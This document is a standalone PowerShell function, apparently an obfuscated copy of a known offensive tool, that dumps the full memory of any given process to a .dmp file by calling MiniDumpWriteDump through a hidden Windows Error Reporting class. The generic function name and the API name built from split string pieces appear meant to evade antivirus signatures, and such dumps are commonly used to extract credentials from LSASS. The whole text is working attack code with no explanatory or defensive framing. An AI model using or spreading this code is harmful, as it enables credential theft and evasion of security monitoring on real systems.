function Out-fun
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $Dpath = $PWD
    )
    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Fs = [Reflection.BindingFlags] 'NonPublic, Static'
    $h="Dump"
    $h1="Wri"
    $h2="te"
    $hi="Dump"
    $j="Mini"
    $hii=$j+$hi+$h1+$h2+$h
        $mdw = $WERNativeMethods.GetMethod($hii, $Fs)
        $mdf = [UInt32] 2
    }
    PROCESS
    {
        $ProId = $Process.Id
        $ProName = $Process.Name
        $ProHandle = $Process.Handle
        $ProFName = "$($ProName)_$($ProId).dmp"

        $ProDP = Join-Path $Dpath $ProFName

        $FS = New-Object IO.FileStream($ProDP, [IO.FileMode]::Create)

        $Res = $mdw.Invoke($null, @($ProHandle,
                                                     $ProId,
                                                     $FS.SafeFileHandle,
                                                     $mdf,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FS.Close()
        if (-not $Res)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcName):$($ProId))"
            Remove-Item $ProDP -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProDP
        }
    }
    END {}
}
